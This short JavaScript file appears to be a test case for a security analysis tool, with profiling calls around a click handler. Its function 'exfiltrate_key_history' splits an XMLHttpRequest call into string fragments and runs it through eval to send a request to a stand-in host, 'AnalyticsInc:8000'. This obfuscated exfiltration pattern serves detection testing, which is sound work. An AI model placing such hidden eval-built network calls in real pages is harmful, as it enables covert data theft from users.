
JAM.startProfile('load');
function exfiltrate_key_history() {
  var a = "xmlhttp=new XMLHt";
  var b = "tpRequest();";
  var c = "xmlhttp.op";
  var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
  var e$$4 = "xmlhttp.se";
  var f = "nd(null);";
  var v5 = a + b;
  var v4 = v5 + c;
  var v3 = v4 + d;
  var v2 = v3 + e$$4;
  var v0 = v2 + f;
  eval(v0);
  return;
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history

JAM.stopProfile('load');
